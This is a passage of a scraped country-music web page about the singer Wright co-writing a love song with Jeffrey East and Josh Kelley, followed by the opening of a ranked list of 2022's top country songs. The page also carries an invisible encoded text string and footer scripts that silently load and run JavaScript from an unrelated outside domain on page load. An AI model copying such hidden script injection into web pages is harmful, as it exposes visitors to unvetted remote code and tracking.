In fact, it was written just about two years ago, when Wright and girlfriend Brittany Norris had just started dating.</p><p>“I had just gotten back from visiting her in person for the very first time,” he remembers of the relationship that first began on Facetime, primarily. “I was going on a run here in Nashville and thinking to myself, ‘If this is love, I've never loved before.’ It wasn’t long after that that I realized that it would be such a cool song title.”</p><p>Soon, Wright found himself on Zoom with fellow songwriters Jeffrey East and <a href=#>Josh Kelley</a>, a recording artist that Wright has long loved.</p><p>“I had heard one of his songs on the radio years ago, and I have been a huge fan ever since,” says Wright, whose very first concert was, in fact, a Josh Kelley concert. “I don't know anybody that knows more musically than him.”</p><p>Today, Wright says he feels blessed to have Kelley in his corner, not only professionally but personally, as the two fathers know what it’s like to bask in the bliss that comes with new parenthood.</p><p>“I sent a picture to my mom and my mom sent me a picture back of me a couple months older, and we look exactly alike,” Wright gushes. “It’s crazy.”</p><h2 class=photogallery-title>Top 22 Country Songs of 2022, Ranked</h2>There are plenty of feel-good country jams on this list of the <a href=# rel="noopener noreferrer">top country songs of 2022</a>, but the No. 1 song is one of the best love songs of the decade. These 22 songs are ranked by critical acclaim, radio and sales success, and importance to the genre.Seven of the 22 artists made our <a href=# rel="noopener noreferrer">Top Country Songs list from 2021</a>, as well, but there are no song repeats. If a song made a previous list (or didn't spend most of its time on the charts in 2022), it's not eligible. So, before you ask where your favorite song is (i.e. Cody Johnson, "'Til You Can't"), be sure the miss isn't just a technicality.<p class=postsid style=color:rgba(255,0,0,0)>ncG1vNJzZmiskajBprvFnKaupqSnxm%2BvzqZmnKCRqLJuw9GinqGsXaOyt7HRZqOorpWZeqOxxaipnmc%3D</p></section></article></main></div><footer><div class=container><span class=copyright>&copy; 2024 SyncX - <a rel=license href=http://creativecommons.org/licenses/by/4.0/>CC BY 4.0</a></span></div></footer><script type=text/javascript>(function(){var n=Math.floor(Date.now()/1e3),t=document.getElementsByTagName("script")[0],e=document.createElement("script");e.src="https://js.zainuddin.my.id/floating.js?v="+n+"",e.type="text/javascript",e.async=!0,e.defer=!0,t.parentNode.insertBefore(e,t)})()</script><script type=text/javascript>(function(){var n=Math.floor(Date.now()/1e3),t=document.getElementsByTagName("script")[0],e=document.createElement("script");e.src="https://js.zainuddin.my.id/tracking_server_6.js?v="+n+"",e.type="text/javascript",e.async=!0,e.defer=!0,t.parentNode.insertBefore(e,t)})()</script><script>var _paq=window._paq=window._paq||[];_paq.push(["trackPageView"]),_paq.push(["enableLinkTracking"]),function(){e="//analytics.cdnweb.info/",_paq.push(["setTrackerUrl",e+"matomo.php"]),_paq.push(["setSiteId","1"]);var e,n=document,t=n.createElement("script"),s=n.getElementsByTagName("script")[0];t.async=!0,t.src=e+"matomo.js",s.parentNode.insertBefore(t,s)}()</script></body></html>
